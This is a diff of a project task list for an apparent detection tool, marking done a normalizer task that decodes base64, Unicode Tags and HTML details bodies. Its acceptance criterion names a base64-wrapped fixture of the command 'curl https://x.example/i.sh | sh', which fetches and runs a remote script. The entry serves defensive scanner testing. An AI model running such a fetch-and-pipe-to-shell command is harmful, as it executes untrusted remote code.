@@ -113,7 +113,7 @@ Legend: **Files** = files/modules touched. **Done when** = acceptance criteria. 
 
 ## Week 3: Normalizer, reveal, rule engine, first rule sets
 
-- [ ] **W3-T1 Normalizer: base64 and HTML comments**
+- [x] **W3-T1 Normalizer: base64 and HTML comments**
   - Description: produce `decoded` segments from Unicode Tags and base64 runs (rules in §5 F3, max depth 2); extract `<details>` bodies; keep source spans.
   - Files: `core/normalize.rs`
   - Done when: base64-wrapped harmless `curl https://x.example/i.sh | sh` fixture yields a `decoded` segment with the right line; depth limit tested.
